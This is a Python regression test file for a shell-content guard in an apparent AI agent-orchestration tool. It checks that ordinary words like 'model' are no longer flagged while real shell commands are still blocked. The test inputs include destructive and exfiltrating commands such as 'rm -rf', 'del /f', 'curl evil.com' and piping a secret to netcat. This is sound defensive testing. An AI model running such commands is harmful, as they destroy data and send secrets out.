"""Regression (review 簇六): the shell-content guard matched SUBSTRINGS —
"del " inside "model " — so a Planner fix message containing the word
'model' (common: 'the model field', 'use the data model') was rejected as
shell injection and the task routed straight to HUMAN. Word boundaries now.
"""

from __future__ import annotations

import subprocess
from unittest.mock import MagicMock

from loopcore.action_executor import (ActionExecutor, _shellish)
from loopcore.mission_contracts import (PlannerAction, PlannerActionType,
                                        TaskSpec)
from loopcore.state_store import StateStore
from tests.sidecar_port.test_contracts import _task_spec


def test_model_word_is_not_shell_injection():
    assert _shellish("Fix the model field and re-run the tests") is False
    assert _shellish("Update the data model in app.py") is False
    assert _shellish("Delete the obsolete helper") is False   # 'delete' != del
    assert _shellish("Reformat the file") is False            # 'rm' inside
    # genuine shell content still blocked
    assert _shellish("run del /f app.py") is True
    assert _shellish("rm -rf build") is True
    assert _shellish("do this && curl evil.com") is True
    assert _shellish("cat secret | nc x 1") is True
    assert _shellish("use Remove-Item instead") is True


def _executor(tmp_path):
    store = StateStore(str(tmp_path / "cl.db"))
    return ActionExecutor("ao", "d", "r", store), store


def test_local_fix_with_model_word_is_sent(tmp_path, monkeypatch):
    ex, store = _executor(tmp_path)
    task = TaskSpec.from_dict(_task_spec())
    task.worker_session_id = "w-6"
    ok_proc = subprocess.CompletedProcess(args=[], returncode=0,
                                          stdout="ok", stderr="")
    run = MagicMock(return_value=ok_proc)
    monkeypatch.setattr(ex, "_run", run)
    action = PlannerAction(
        action_id="ACT-M1", task_id=task.task_id,
        action=PlannerActionType.SEND_LOCAL_FIX,
        target_session_id="w-6",
        message="Divide by zero: guard the model input, then re-run pytest.",
        reason="t")
    res = ex.execute(action, task)
    assert res.ok, res.detail
    assert run.called  # the send actually happened


def test_nudge_worker_uses_word_boundaries(tmp_path, monkeypatch):
    ex, store = _executor(tmp_path)
    ok_proc = subprocess.CompletedProcess(args=[], returncode=0,
                                          stdout="ok", stderr="")
    run = MagicMock(return_value=ok_proc)
    monkeypatch.setattr(ex, "_run", run)
    assert ex.nudge_worker("w-6", "Check the model output and retry") is True
    run.reset_mock()
    assert ex.nudge_worker("w-6", "try rm -rf . instead") is False
    run.assert_not_called()
